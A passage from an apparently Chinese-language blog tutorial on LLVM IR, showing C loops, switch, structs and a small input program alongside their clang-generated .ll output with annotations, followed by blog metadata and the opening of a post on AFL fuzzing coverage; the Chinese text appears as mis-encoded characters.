&quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;&#x3D;&quot;generic&quot; &#125; !llvm.module.flags &#x3D; !&#123;!0, !1, !2&#125; !llvm.ident &#x3D; !&#123;!3&#125; !0 &#x3D; !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125; !1 &#x3D; !&#123;i32 7, !&quot;uwtable&quot;, i32 1&#125; !2 &#x3D; !&#123;i32 7, !&quot;frame-pointer&quot;, i32 2&#125; !3 &#x3D; !&#123;!&quot;clang version 14.0.0&quot;&#125; é€šè¿‡icmpæŒ‡ä»¤è¿›è¡Œæ¯”è¾ƒï¼Œäº§ç”Ÿä¸€ä¸ªç»“æœå€¼ bræŒ‡ä»¤æ ¹æ®ç»“æœå€¼ï¼Œè·³è½¬åˆ°ç›¸åº”çš„åˆ†æ”¯å…¥å£ åˆ†æ”¯æ‰§è¡Œå®Œæˆåï¼Œæ ¹æ®bræ— æ¡ä»¶åˆ†æ”¯è·³è½¬åˆ°ç»“æŸåˆ†æ”¯ 3. While è¯­å¥ # while.c #include &lt;stdio.h> int main() &#123; int a = 0, b = 1; while(a &lt; 10) &#123; a++; b *= a; &#125; return b; &#125; #while.ll ; ModuleID &#x3D; &#39;while.c&#39; source_filename &#x3D; &quot;while.c&quot; target datalayout &#x3D; &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot; target triple &#x3D; &quot;x86_64-unknown-linux-gnu&quot; ; Function Attrs: noinline nounwind optnone uwtable define dso_local i32 @main() #0 &#123; %1 &#x3D; alloca i32, align 4 %2 &#x3D; alloca i32, align 4 %3 &#x3D; alloca i32, align 4 store i32 0, i32* %1, align 4 store i32 0, i32* %2, align 4 store i32 1, i32* %3, align 4 br label %4 ; è¿›å…¥æ ‡ç­¾%4, è¿›å…¥whileå¾ªç¯å…¥å£ ; è¿›å…¥whileå¾ªç¯å…¥å£ 4: ; preds &#x3D; %7, %0 %5 &#x3D; load i32, i32* %2, align 4 %6 &#x3D; icmp slt i32 %5, 10 ; æ¯”è¾ƒ%5 å°äº10 br i1 %6, label %7, label %13 ; æ ¹æ®%6 æ¯”è¾ƒçš„ç»“æœåˆ†æ”¯è¿›å…¥%7 æˆ–%13 ; while å¾ªç¯ body 7: ; preds &#x3D; %4 %8 &#x3D; load i32, i32* %2, align 4 ; ä»%2ä¸­è¯»å–å€¼ ä»¥i32ç±»å‹å­˜åˆ°%8ä¸­ %9 &#x3D; add nsw i32 %8, 1 ; %9 &#x3D; %8 +1 store i32 %9, i32* %2, align 4 ; å°†%9 å­˜åˆ°%2ä¸­ %10 &#x3D; load i32, i32* %2, align 4 ; ä»%2ä¸­è¯»å–å€¼ ä»¥i32ç±»å‹å­˜åˆ°%10ä¸­ %11 &#x3D; load i32, i32* %3, align 4 ; ä»%3ä¸­è¯»å–å€¼ ä»¥i32ç±»å‹å­˜åˆ°%11ä¸­ %12 &#x3D; mul nsw i32 %11, %10 ; %12 &#x3D; %11 * %10 store i32 %12, i32* %3, align 4 ; å°†%12 å­˜åˆ°%3ä¸­ br label %4, !llvm.loop !4 13: ; preds &#x3D; %4 %14 &#x3D; load i32, i32* %3, align 4 ret i32 %14 &#125; attributes #0 &#x3D; &#123; noinline nounwind optnone uwtable &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;min-legal-vector-width&quot;&#x3D;&quot;0&quot; &quot;no-trapping-math&quot;&#x3D;&quot;true&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;&#x3D;&quot;generic&quot; &#125; !llvm.module.flags &#x3D; !&#123;!0, !1, !2&#125; !llvm.ident &#x3D; !&#123;!3&#125; !0 &#x3D; !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125; !1 &#x3D; !&#123;i32 7, !&quot;uwtable&quot;, i32 1&#125; !2 &#x3D; !&#123;i32 7, !&quot;frame-pointer&quot;, i32 2&#125; !3 &#x3D; !&#123;!&quot;clang version 14.0.0&quot;&#125; !4 &#x3D; distinct !&#123;!4, !5&#125; !5 &#x3D; !&#123;!&quot;llvm.loop.mustprogress&quot;&#125; é€šè¿‡icmpæŒ‡ä»¤è¿›è¡Œå¾ªç¯æ¡ä»¶æ¯”è¾ƒ é€šè¿‡bræŒ‡ä»¤è¿›è¡Œæ§åˆ¶è·³è½¬ loopå¾ªç¯ï¼Œç›´åˆ° è·³å‡ºåˆ°while.end 4. for è¯­å¥ #for.c #include &lt;stdio.h> int main()&#123; int i = 1; int a = 0; for(; i &lt;= 50; i++)&#123; a += i; &#125; printf(\"%d\\n\",a); return 0; &#125; #for.ll ; ModuleID &#x3D; &#39;for.c&#39; source_filename &#x3D; &quot;for.c&quot; target datalayout &#x3D; &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot; target triple &#x3D; &quot;x86_64-unknown-linux-gnu&quot; @.str &#x3D; private unnamed_addr constant [4 x i8] c&quot;%d\\0A\\00&quot;, align 1 ; Function Attrs: noinline nounwind optnone uwtable define dso_local i32 @main() #0 &#123; %1 &#x3D; alloca i32, align 4 %2 &#x3D; alloca i32, align 4 %3 &#x3D; alloca i32, align 4 store i32 0, i32* %1, align 4 store i32 1, i32* %2, align 4 store i32 0, i32* %3, align 4 br label %4 ; è·³è½¬åˆ°forå¾ªç¯å…¥å£ ; for å¾ªç¯å…¥å£ 4: ; preds &#x3D; %11, %0 %5 &#x3D; load i32, i32* %2, align 4 %6 &#x3D; icmp sle i32 %5, 50 br i1 %6, label %7, label %14 ; å¾ªç¯loopæ§åˆ¶ ; for å¾ªç¯ body 7: 1 ; preds &#x3D; %4 %8 &#x3D; load i32, i32* %2, align 4 %9 &#x3D; load i32, i32* %3, align 4 %10 &#x3D; add nsw i32 %9, %8 store i32 %10, i32* %3, align 4 br label %11 ; for å¾ªç¯ ç¬¬ä¸‰éƒ¨åˆ†æ“ä½œ 11: ; preds &#x3D; %7 %12 &#x3D; load i32, i32* %2, align 4 %13 &#x3D; add nsw i32 %12, 1 store i32 %13, i32* %2, align 4 br label %4, !llvm.loop !4 14: ; preds &#x3D; %4 %15 &#x3D; load i32, i32* %3, align 4 %16 &#x3D; call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0), i32 noundef %15) ret i32 0 &#125; declare dso_local i32 @printf(i8* noundef, ...) #1 attributes #0 &#x3D; &#123; noinline nounwind optnone uwtable &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;min-legal-vector-width&quot;&#x3D;&quot;0&quot; &quot;no-trapping-math&quot;&#x3D;&quot;true&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;&#x3D;&quot;generic&quot; &#125; attributes #1 &#x3D; &#123; &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;no-trapping-math&quot;&#x3D;&quot;true&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;&#x3D;&quot;generic&quot; &#125; !llvm.module.flags &#x3D; !&#123;!0, !1, !2&#125; !llvm.ident &#x3D; !&#123;!3&#125; !0 &#x3D; !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125; !1 &#x3D; !&#123;i32 7, !&quot;uwtable&quot;, i32 1&#125; !2 &#x3D; !&#123;i32 7, !&quot;frame-pointer&quot;, i32 2&#125; !3 &#x3D; !&#123;!&quot;clang version 14.0.0&quot;&#125; !4 &#x3D; distinct !&#123;!4, !5&#125; !5 &#x3D; !&#123;!&quot;llvm.loop.mustprogress&quot;&#125; if,for,while ä¸‰ä¸ªç»“æ„ç±»å‹ï¼Œ å³ æ¡ä»¶åˆ¤æ–­+å¾ªç¯æ§åˆ¶ 5. Switch #switch.c #include &lt;stdio.h> int main()&#123; int i = 1; int a = 0; for(; i &lt;= 50; i++)&#123; a += i; switch(a)&#123; case 15: printf(\"a = 25, i = %d\\n \",i); break; case 105: printf(\"a = 105, i= %d\\n \",i); break; case 990: printf(\"a = 990, i = %d\\n \",i); break; &#125; &#125; printf(\"%d\\n\",a); return 0; &#125; #switch.ll ; ModuleID &#x3D; &#39;switch.c&#39; source_filename &#x3D; &quot;switch.c&quot; target datalayout &#x3D; &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot; target triple &#x3D; &quot;x86_64-unknown-linux-gnu&quot; @.str &#x3D; private unnamed_addr constant [18 x i8] c&quot;a &#x3D; 25, i &#x3D; %d\\0A \\00&quot;, align 1 @.str.1 &#x3D; private unnamed_addr constant [19 x i8] c&quot;a &#x3D; 105, i&#x3D; %d\\0A \\00&quot;, align 1 @.str.2 &#x3D; private unnamed_addr constant [19 x i8] c&quot;a &#x3D; 990, i &#x3D; %d\\0A \\00&quot;, align 1 @.str.3 &#x3D; private unnamed_addr constant [4 x i8] c&quot;%d\\0A\\00&quot;, align 1 ; Function Attrs: noinline nounwind optnone uwtable define dso_local i32 @main() #0 &#123; %1 &#x3D; alloca i32, align 4 %2 &#x3D; alloca i32, align 4 %3 &#x3D; alloca i32, align 4 store i32 0, i32* %1, align 4 store i32 1, i32* %2, align 4 store i32 0, i32* %3, align 4 br label %4 ; è¿›å…¥forå¾ªç¯å…¥å£ # forå¾ªç¯å…¥å£ 4: ; preds &#x3D; %22, %0 %5 &#x3D; load i32, i32* %2, align 4 %6 &#x3D; icmp sle i32 %5, 50 br i1 %6, label %7, label %25 ; forå¾ªç¯ body 7: ; preds &#x3D; %4 %8 &#x3D; load i32, i32* %2, align 4 %9 &#x3D; load i32, i32* %3, align 4 %10 &#x3D; add nsw i32 %9, %8 store i32 %10, i32* %3, align 4 %11 &#x3D; load i32, i32* %3, align 4 switch i32 %11, label %21 [ ; switch åˆ¤æ–­a i32 15, label %12 i32 105, label %15 i32 990, label %18 ] ; label %12 12: ; preds &#x3D; %7 %13 &#x3D; load i32, i32* %2, align 4 %14 &#x3D; call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([18 x i8], [18 x i8]* @.str, i64 0, i64 0), i32 noundef %13) br label %21 ; label %12 15: ; preds &#x3D; %7 %16 &#x3D; load i32, i32* %2, align 4 %17 &#x3D; call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([19 x i8], [19 x i8]* @.str.1, i64 0, i64 0), i32 noundef %16) br label %21 ; label %12 18: ; preds &#x3D; %7 %19 &#x3D; load i32, i32* %2, align 4 %20 &#x3D; call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([19 x i8], [19 x i8]* @.str.2, i64 0, i64 0), i32 noundef %19) br label %21 21: ; preds &#x3D; %7, %18, %15, %12 br label %22 ; for å¾ªç¯å°¾éƒ¨+1 22: ; preds &#x3D; %21 %23 &#x3D; load i32, i32* %2, align 4 %24 &#x3D; add nsw i32 %23, 1 store i32 %24, i32* %2, align 4 br label %4, !llvm.loop !4 25: ; preds &#x3D; %4 %26 &#x3D; load i32, i32* %3, align 4 %27 &#x3D; call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.3, i64 0, i64 0), i32 noundef %26) ret i32 0 &#125; declare dso_local i32 @printf(i8* noundef, ...) #1 attributes #0 &#x3D; &#123; noinline nounwind optnone uwtable &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;min-legal-vector-width&quot;&#x3D;&quot;0&quot; &quot;no-trapping-math&quot;&#x3D;&quot;true&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;&#x3D;&quot;generic&quot; &#125; attributes #1 &#x3D; &#123; &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;no-trapping-math&quot;&#x3D;&quot;true&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;&#x3D;&quot;generic&quot; &#125; !llvm.module.flags &#x3D; !&#123;!0, !1, !2&#125; !llvm.ident &#x3D; !&#123;!3&#125; !0 &#x3D; !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125; !1 &#x3D; !&#123;i32 7, !&quot;uwtable&quot;, i32 1&#125; !2 &#x3D; !&#123;i32 7, !&quot;frame-pointer&quot;, i32 2&#125; !3 &#x3D; !&#123;!&quot;clang version 14.0.0&quot;&#125; !4 &#x3D; distinct !&#123;!4, !5&#125; !5 &#x3D; !&#123;!&quot;llvm.loop.mustprogress&quot;&#125; 6. ç»“æ„ä½“ //struct.c #include&lt;stdio.h> #include&lt;stdlib.h> #include&lt;unistd.h> #include&lt;string.h> struct People&#123; char *num; int age; char name[10]; &#125;; struct Class&#123; int id; struct People people; &#125;; int main()&#123; struct Class class; class.id = 1; class.people.num = \"211501\"; class.people.age = 22; strcpy(class.people.name, \"test\"); printf(\"id = %d ; age = %d ; num = %s; name = %s\\n\",class.id,class.people.age,class.people.num,class.people.name); return 0; &#125; å¯è¯»struct.llæ–‡ä»¶ ; ModuleID &#x3D; &#39;struct.c&#39; source_filename &#x3D; &quot;struct.c&quot; target datalayout &#x3D; &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot; target triple &#x3D; &quot;x86_64-unknown-linux-gnu&quot; %struct.Class &#x3D; type &#123; i32, %struct.People &#125; %struct.People &#x3D; type &#123; i8*, i32, [10 x i8] &#125; ; i32ç±»å‹ 10*i8çš„ç©ºé—´ @.str &#x3D; private unnamed_addr constant [7 x i8] c&quot;211501\\00&quot;, align 1 @.str.1 &#x3D; private unnamed_addr constant [5 x i8] c&quot;test\\00&quot;, align 1 @.str.2 &#x3D; private unnamed_addr constant [42 x i8] c&quot;id &#x3D; %d ; age &#x3D; %d ; num &#x3D; %s; name &#x3D; %s\\0A\\00&quot;, align 1 ; Function Attrs: noinline nounwind optnone uwtable define dso_local i32 @main() #0 &#123; %1 &#x3D; alloca i32, align 4 %2 &#x3D; alloca %struct.Class, align 8 ; åˆ†é…%struct.Classç©ºé—´ç»™%2 store i32 0, i32* %1, align 4 ; æŒ‡ä»¤æ¥è·å¾—æŒ‡å‘æ•°ç»„çš„å…ƒç´ å’ŒæŒ‡å‘ç»“æ„ä½“æˆå‘˜çš„æŒ‡é’ˆ ; è·å–classç¬¬ä¸€ä¸ªæˆå‘˜çš„æŒ‡é’ˆç»™%3 å³ int id; %3 &#x3D; getelementptr inbounds %struct.Class, %struct.Class* %2, i32 0, i32 0 ; åˆ†é…1ç»™æŒ‡é’ˆ%3 å³ class.id &#x3D; 1 store i32 1, i32* %3, align 8 ; è·å–classçš„ç¬¬äºŒä¸ªæˆå‘˜æŒ‡é’ˆç»™%4 å³ struct People people; %4 &#x3D; getelementptr inbounds %struct.Class, %struct.Class* %2, i32 0, i32 1 ; è·å–class.peopleç»“æ„ä½“çš„ç¬¬ä¸€ä¸ªæˆå‘˜æŒ‡é’ˆç»™%5 %5 &#x3D; getelementptr inbounds %struct.People, %struct.People* %4, i32 0, i32 0 ; åˆ†é…@.strçš„å†…å®¹ç»™%5 å³ class.people.num &#x3D; &quot;211501&quot;; store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0), i8** %5, align 8 ; è·å–classç»“æ„ä½“çš„ç¬¬äºŒä¸ªæˆå‘˜æŒ‡é’ˆç»™%6 å³ struct People people; %6 &#x3D; getelementptr inbounds %struct.Class, %struct.Class* %2, i32 0, i32 1 ; è·å–class.peopleç»“æ„ä½“çš„ç¬¬äºŒä¸ªæˆå‘˜æŒ‡é’ˆç»™%7 å³ int age; %7 &#x3D; getelementptr inbounds %struct.People, %struct.People* %6, i32 0, i32 1 ; åˆ†é… 22 ç»™ %7 æŒ‡é’ˆæŒ‡å‘åœ°å€ å³ class.people.age &#x3D; 22; store i32 22, i32* %7, align 8 ; è·å–classç»“æ„ä½“çš„ç¬¬äºŒä¸ªæˆå‘˜æŒ‡é’ˆç»™%8 å³ struct People people; %8 &#x3D; getelementptr inbounds %struct.Class, %struct.Class* %2, i32 0, i32 1 ; è·å–class.peopleç»“æ„ä½“çš„ç¬¬ä¸‰ä¸ªæˆå‘˜æŒ‡é’ˆç»™%9 å³ char name[10];; %9 &#x3D; getelementptr inbounds %struct.People, %struct.People* %8, i32 0, i32 2 ; è·å–%9æŒ‡é’ˆæŒ‡å‘çš„ç¬¬ä¸€ä¸ªåœ°å€ %10 &#x3D; getelementptr inbounds [10 x i8], [10 x i8]* %9, i64 0, i64 0 ; è°ƒç”¨strcpyå‡½æ•° åˆ†é…@.str.1 %11 &#x3D; call i8* @strcpy(i8* noundef %10, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0)) #3 ; ä¸ºäº†è¾“å‡ºprintf åšå‡†å¤‡ %12 &#x3D; getelementptr inbounds %struct.Class, %struct.Class* %2, i32 0, i32 0 %13 &#x3D; load i32, i32* %12, align 8 %14 &#x3D; getelementptr inbounds %struct.Class, %struct.Class* %2, i32 0, i32 1 %15 &#x3D; getelementptr inbounds %struct.People, %struct.People* %14, i32 0, i32 1 %16 &#x3D; load i32, i32* %15, align 8 %17 &#x3D; getelementptr inbounds %struct.Class, %struct.Class* %2, i32 0, i32 1 %18 &#x3D; getelementptr inbounds %struct.People, %struct.People* %17, i32 0, i32 0 %19 &#x3D; load i8*, i8** %18, align 8 %20 &#x3D; getelementptr inbounds %struct.Class, %struct.Class* %2, i32 0, i32 1 %21 &#x3D; getelementptr inbounds %struct.People, %struct.People* %20, i32 0, i32 2 %22 &#x3D; getelementptr inbounds [10 x i8], [10 x i8]* %21, i64 0, i64 0 %23 &#x3D; call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([42 x i8], [42 x i8]* @.str.2, i64 0, i64 0), i32 noundef %13, i32 noundef %16, i8* noundef %19, i8* noundef %22) ret i32 0 &#125; ; Function Attrs: nounwind declare dso_local i8* @strcpy(i8* noundef, i8* noundef) #1 declare dso_local i32 @printf(i8* noundef, ...) #2 attributes #0 &#x3D; &#123; noinline nounwind optnone uwtable &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;min-legal-vector-width&quot;&#x3D;&quot;0&quot; &quot;no-trapping-math&quot;&#x3D;&quot;true&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;&#x3D;&quot;generic&quot; &#125; attributes #1 &#x3D; &#123; nounwind &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;no-trapping-math&quot;&#x3D;&quot;true&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;&#x3D;&quot;generic&quot; &#125; attributes #2 &#x3D; &#123; &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;no-trapping-math&quot;&#x3D;&quot;true&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;&#x3D;&quot;generic&quot; &#125; attributes #3 &#x3D; &#123; nounwind &#125; !llvm.module.flags &#x3D; !&#123;!0, !1, !2&#125; !llvm.ident &#x3D; !&#123;!3&#125; !0 &#x3D; !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125; !1 &#x3D; !&#123;i32 7, !&quot;uwtable&quot;, i32 1&#125; !2 &#x3D; !&#123;i32 7, !&quot;frame-pointer&quot;, i32 2&#125; !3 &#x3D; !&#123;!&quot;clang version 14.0.0&quot;&#125; ç»“æ„ä½“å’Œæ•°ç»„éœ€è¦ç°ä½¿ç”¨getelementptr è·å–æŒ‡å‘æ•°ç»„æˆ–ç»“æ„æˆå‘˜çš„æŒ‡é’ˆï¼Œç„¶åæ ¹æ®æŒ‡é’ˆæŒ‡å‘çš„å†…å®¹è¿›è¡Œèµ‹å€¼æˆ–åšè¿ç®— 7. ç‰›åˆ€å°è¯• //main.c #define _GNU_SOURCE #include &lt;stdio.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;stdlib.h> int main() &#123; puts(\"plz input two numbers\"); size_t bufsize = 100; char* buf = malloc(bufsize); getline(&amp;buf, &amp;bufsize, stdin); double f1 = atof(buf); getline(&amp;buf, &amp;bufsize, stdin); double f2 = atof(buf); printf(\"%.2f + %.2f = %.2f \\n\", f1, f2, f1+f2); free(buf); return 0; &#125; è½¬æ¢æˆå¯è¯» llæ–‡ä»¶ $ clang -emit-llvm -S main.c -o main.ll ; ModuleID &#x3D; &#39;main.c&#39; source_filename &#x3D; &quot;main.c&quot; target datalayout &#x3D; &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot; target triple &#x3D; &quot;x86_64-unknown-linux-gnu&quot; %struct._IO_FILE &#x3D; type &#123; i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] &#125; %struct._IO_marker &#x3D; type opaque %struct._IO_codecvt &#x3D; type opaque %struct._IO_wide_data &#x3D; type opaque @.str &#x3D; private unnamed_addr constant [22 x i8] c&quot;plz input two numbers\\00&quot;, align 1 @stdin &#x3D; external dso_local global %struct._IO_FILE*, align 8 @.str.1 &#x3D; private unnamed_addr constant [21 x i8] c&quot;%.2f + %.2f &#x3D; %.2f \\0A\\00&quot;, align 1 ; Function Attrs: noinline nounwind optnone uwtable define dso_local i32 @main() #0 &#123; %1 &#x3D; alloca i32, align 4 ; åˆ†é…ç©ºé—´ %2 &#x3D; alloca i64, align 8 ; åˆ†é…ç©ºé—´ %3 &#x3D; alloca i8*, align 8 ; åˆ†é…ç©ºé—´ %4 &#x3D; alloca double, align 8 ; åˆ†é…ç©ºé—´ %5 &#x3D; alloca double, align 8 ; åˆ†é…ç©ºé—´ store i32 0, i32* %1, align 4 ; åˆ†é…é»˜è®¤å€¼0 ; è°ƒç”¨è¾“å‡º %6 &#x3D; call i32 @puts(i8* noundef getelementptr inbounds ([22 x i8], [22 x i8]* @.str, i64 0, i64 0)) store i64 100, i64* %2, align 8 ; å­˜å‚¨100 åˆ° i64æŒ‡é’ˆ%2 %7 &#x3D; load i64, i64* %2, align 8 %8 &#x3D; call noalias i8* @malloc(i64 noundef %7) #4 ; åŠ¨æ€åˆ†é…å†…å­˜å¤§å°ä¸º%7çš„ç©ºé—´ store i8* %8, i8** %3, align 8 ; å°†åˆ†é…çš„ç©ºé—´å­˜åˆ°%3æŒ‡é’ˆ %9 &#x3D; load %struct._IO_FILE*, %struct._IO_FILE** @stdin, align 8 ; è¾“å…¥çš„%9 %10 &#x3D; call i64 @getline(i8** noundef %3, i64* noundef %2, %struct._IO_FILE* noundef %9) %11 &#x3D; load i8*, i8** %3, align 8 %12 &#x3D; call double @atof(i8* noundef %11) #5 store double %12, double* %4, align 8 %13 &#x3D; load %struct._IO_FILE*, %struct._IO_FILE** @stdin, align 8 %14 &#x3D; call i64 @getline(i8** noundef %3, i64* noundef %2, %struct._IO_FILE* noundef %13) %15 &#x3D; load i8*, i8** %3, align 8 %16 &#x3D; call double @atof(i8* noundef %15) #5 store double %16, double* %5, align 8 %17 &#x3D; load double, double* %4, align 8 %18 &#x3D; load double, double* %5, align 8 %19 &#x3D; load double, double* %4, align 8 %20 &#x3D; load double, double* %5, align 8 %21 &#x3D; fadd double %19, %20 %22 &#x3D; call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([21 x i8], [21 x i8]* @.str.1, i64 0, i64 0), double noundef %17, double noundef %18, double noundef %21) %23 &#x3D; load i8*, i8** %3, align 8 call void @free(i8* noundef %23) #4 ret i32 0 &#125; declare dso_local i32 @puts(i8* noundef) #1 ; Function Attrs: nounwind declare dso_local noalias i8* @malloc(i64 noundef) #2 declare dso_local i64 @getline(i8** noundef, i64* noundef, %struct._IO_FILE* noundef) #1 ; Function Attrs: nounwind readonly willreturn declare dso_local double @atof(i8* noundef) #3 declare dso_local i32 @printf(i8* noundef, ...) #1 ; Function Attrs: nounwind declare dso_local void @free(i8* noundef) #2 attributes #0 &#x3D; &#123; noinline nounwind optnone uwtable &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;min-legal-vector-width&quot;&#x3D;&quot;0&quot; &quot;no-trapping-math&quot;&#x3D;&quot;true&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;&#x3D;&quot;generic&quot; &#125; attributes #1 &#x3D; &#123; &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;no-trapping-math&quot;&#x3D;&quot;true&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;&#x3D;&quot;generic&quot; &#125; attributes #2 &#x3D; &#123; nounwind &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;no-trapping-math&quot;&#x3D;&quot;true&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;&#x3D;&quot;generic&quot; &#125; attributes #3 &#x3D; &#123; nounwind readonly willreturn &quot;frame-pointer&quot;&#x3D;&quot;all&quot; &quot;no-trapping-math&quot;&#x3D;&quot;true&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;&#x3D;&quot;generic&quot; &#125; attributes #4 &#x3D; &#123; nounwind &#125; attributes #5 &#x3D; &#123; nounwind readonly willreturn &#125; !llvm.module.flags &#x3D; !&#123;!0, !1, !2&#125; !llvm.ident &#x3D; !&#123;!3&#125; !0 &#x3D; !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125; !1 &#x3D; !&#123;i32 7, !&quot;uwtable&quot;, i32 1&#125; !2 &#x3D; !&#123;i32 7, !&quot;frame-pointer&quot;, i32 2&#125; !3 &#x3D; !&#123;!&quot;clang version 14.0.0&quot;&#125;","categories":[{"name":"Master","slug":"Master","permalink":"https://www.sizaif.com/navigation/categories/Master/"},{"name":"LLVM","slug":"Master/LLVM","permalink":"https://www.sizaif.com/navigation/categories/Master/LLVM/"}],"tags":[{"name":"fuzzing","slug":"fuzzing","permalink":"https://www.sizaif.com/tags/fuzzing/"},{"name":"LLVM","slug":"LLVM","permalink":"https://www.sizaif.com/tags/LLVM/"}],"author":"sizaif"},{"title":"AFL(american Fuzzy Lop)å­¦ä¹ äºŒ","slug":"AFL-american-fuzzy-lop-å­¦ä¹ äºŒ","date":"2022-04-19T02:37:17.000Z","updated":"2022-04-19T02:49:53.054Z","comments":true,"path":"posts/3594e8de/","link":"","permalink":"https://www.sizaif.com/posts/3594e8de/","excerpt":"","text":"AFL(american fuzzy lop)å­¦ä¹ äºŒ @sizaif @2022-04-10 è®¾è®¡æ€æƒ³ è¦†ç›–ç‡è®¡ç®— æ”¹è¿›è¾¹ç¼˜è¦†ç›–ï¼š å‘ç›®æ ‡ç¨‹åºæ³¨å…¥ä»¥ä¸‹å·¥å…·æ¥æ•è·åˆ†æ”¯(è¾¹ç¼˜)è¦†ç›–ç‡å’Œåˆ†æ”¯å‘½ä¸­è®¡æ•° ä¸€æ¡è¾¹è¡¨ç¤ºä¸ºå½“å‰åŸºæœ¬å—(åˆ†é…äº†ä¸€ä¸ªéšæœºå¸¸æ•°)ä¸å‰ä¸€ä¸ªåŸºæœ¬å—(å³å…ƒç»„ (prev_location, cur_location))ä¹‹é—´çš„ XOR 